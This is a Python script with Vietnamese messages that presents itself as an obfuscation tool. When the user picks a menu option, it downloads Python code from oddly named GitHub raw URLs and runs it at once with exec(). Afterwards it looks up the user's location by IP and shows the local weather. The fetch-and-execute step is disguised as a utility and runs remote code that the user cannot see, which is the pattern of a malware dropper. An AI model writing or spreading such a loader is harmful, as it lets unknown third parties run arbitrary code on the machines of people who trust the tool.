import requests
import sys
__import__('os').system("cls" if __import__('os').name == "nt" else "clear")

# URLs of the source code (1-3 only)
urls = {
    'Obf Python [1]': 'https://raw.githubusercontent.com/Qolaystwushsrsiaoallaksksjs/ljaiotsoaoqqioqosuusrarqyeudowiqtttqq/main/Oreaartreewwwwaaawwwwwwwaaawwwqqq7.py',
    'Obf Python [2]': 'https://raw.githubusercontent.com/Qolaystwushsrsiaoallaksksjs/ljaiotsoaoqqioqosuusrarqyeudowiqtttqq/main/Oreaartreewwwwaaawwwwwwwaaawwwqqq8.py',
    'Obf Python [3]': 'https://raw.githubusercontent.com/Qolaystwushsrsiaoallaksksjs/ljaiotsoaoqqioqosuusrarqyeudowiqtttqq/main/Oreaartreewwwwaaawwwwwwwaaawwwqqq9.py',
}

def check_internet_connection():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

def get_location_by_ip():
    try:
        response = requests.get("https://ipinfo.io")
        data = response.json()
        city = data.get("city")
        region = data.get("region")
        country = data.get("country")
        loc = data.get("loc").split(",")
        latitude, longitude = loc if len(loc) == 2 else (None, None)
        return city, region, country, latitude, longitude
    except Exception as e:
        print(f"Lỗi: {e}")
        return None, None, None, None, None

def get_weather(latitude, longitude):
    try:
        base_url = f"https://wttr.in/{latitude},{longitude}?format=%t"
        response = requests.get(base_url)
        weather_description = response.text.strip()
        return weather_description
    except Exception as e:
        print(f"[Lỗi: {e}]")
        return None

if not check_internet_connection():
    print("[Vui lòng kiểm tra kết nối]")
    sys.exit()

print(">>> Print('Hello World')\n\n\n")
print("# !/usr/bin/python3.11")
print("I am the tool Obf by MinhNguyen3004")

# Hiển thị tùy chọn
for i, name in enumerate(urls.keys(), start=1):
    print(f"[-] {i}. {name}")

try:
    choice = int(input("[-] >>> "))
    
    if 1 <= choice <= len(urls):
        selected_url = list(urls.values())[choice - 1]
    else:
        raise ValueError("Lựa chọn không hợp lệ.")

    # Tải nội dung mã nguồn
    response = requests.get(selected_url)
    response.raise_for_status()  # Kiểm tra xem có lỗi mạng không
    code = response.text

    # Thực thi mã nguồn
    exec(code)

except (requests.RequestException, ValueError) as e:
    print(f"[Lỗi khi tải hoặc thực thi mã nguồn: {e}]")
    sys.exit()

# In thông tin vị trí và thời tiết
city, region, country, latitude, longitude = get_location_by_ip()
if latitude and longitude:
    weather_description = get_weather(latitude, longitude)

    print(f"Vị trí: {city}, {region}, {country}")
    print(f"Tọa độ: Latitude {latitude}, Longitude {longitude}")
    print(f"Thời tiết hiện tại: {weather_description}")
else:
    print("Không thể lấy thông tin vị trí.")
